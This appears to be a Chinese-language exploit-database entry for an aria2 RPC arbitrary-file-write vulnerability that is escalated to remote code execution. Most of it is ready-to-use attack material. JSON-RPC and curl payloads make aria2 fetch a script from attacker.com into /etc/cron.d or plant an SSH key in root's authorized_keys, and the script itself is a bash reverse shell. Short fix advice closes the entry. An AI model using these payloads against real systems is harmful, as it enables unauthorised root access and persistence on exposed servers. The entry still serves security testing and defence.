---
id: ARIA2-RCE
title: Aria2 RPC 任意文件写入漏洞
product: aria2
vendor: aria2
version_affected: "all versions"
severity: CRITICAL
tags: [rce, file_upload, 无需认证]
fingerprint: ["aria2", "JSON-RPC"]
---

## 漏洞描述

Aria2是命令行下载工具，内建XML-RPC和JSON-RPC接口。在有权限的情况下，攻击者可以使用RPC接口操作aria2下载文件到任意目录，造成任意文件写入，配合系统机制可实现RCE。

## 影响版本

- 所有版本的aria2（当RPC接口可访问时）

## 前置条件

- aria2 RPC端口（默认6800）可访问
- 无认证或弱认证

## 利用步骤

1. 使用RPC接口下载文件到计划任务目录
2. 利用cron执行下载的脚本获取shell

## Payload

```json
// 方法1: 使用JSON-RPC写入cron文件
POST /jsonrpc HTTP/1.1
Host: target:6800
Content-Type: application/json

{"jsonrpc":"2.0","method":"aria2.addUri","id":1,
 "params":[
   "token:xxxxxxxx",
   ["http://attacker.com/shell.sh"],
   {"dir":"/etc/cron.d","out":"shell","split":"1","on-download-complete":"/etc/cron.d/shell"}
 ]}

// 方法2: 写入SSH authorized_keys
{"jsonrpc":"2.0","method":"aria2.addUri","id":1,
 "params":[
   "token:xxxxxxxx",
   ["http://attacker.com/id_rsa.pub"],
   {"dir":"/root/.ssh","out":"authorized_keys"}
 ]}

// shell.sh内容
#!/bin/bash
bash -i >& /dev/tcp/attacker-ip/port 0>&1
```

```bash
# 使用yaaw或其他RPC客户端
# Dir: /etc/cron.d
# File Name: shell
# URL: http://attacker.com/shell.sh

# 或直接用curl调用RPC
curl -X POST "http://target:6800/jsonrpc" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"aria2.addUri","id":1,"params":["token:xxxx",["http://attacker.com/shell.sh"],{"dir":"/etc/cron.d","out":"shell"}]}'
```

## 验证方法

```bash
# 检查cron.d是否写入成功
curl "http://target:6800/jsonrpc" \
  -d '{"jsonrpc":"2.0","method":"aria2.tellActive","id":1,"params":["token:xxxx"]}'

# 等待cron执行后检查shell是否触发
```

## 修复建议

1. 对RPC接口启用token认证
2. 限制RPC端口的网络访问
3. 以低权限用户运行aria2
4. 禁用on-download-complete回调
